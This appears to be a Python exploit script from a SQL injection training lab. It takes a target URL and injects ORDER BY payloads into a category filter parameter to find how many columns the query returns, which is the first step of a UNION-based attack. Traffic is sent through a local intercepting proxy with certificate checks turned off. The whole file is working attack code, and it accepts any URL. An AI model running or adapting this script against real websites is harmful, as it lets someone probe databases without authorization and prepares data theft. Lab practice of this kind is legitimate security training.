# SQLi Lab03: SQLi UNION attacks

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': "http://127.0.0.1:8080", 'https:': "http://127.0.0.1:8080"}


def exploit_sql_column_num(url):
    uri = "/filter?category=Gifts"
    for i in range(1, 50):
        sql_payload = "'+ORDER+BY+%s--" % i
        r = requests.get(url + uri + sql_payload,
                         verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out the number of columns ...")
    num_col = exploit_sql_column_num(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")

    else:
        print("[-] The SQLi was not successful")
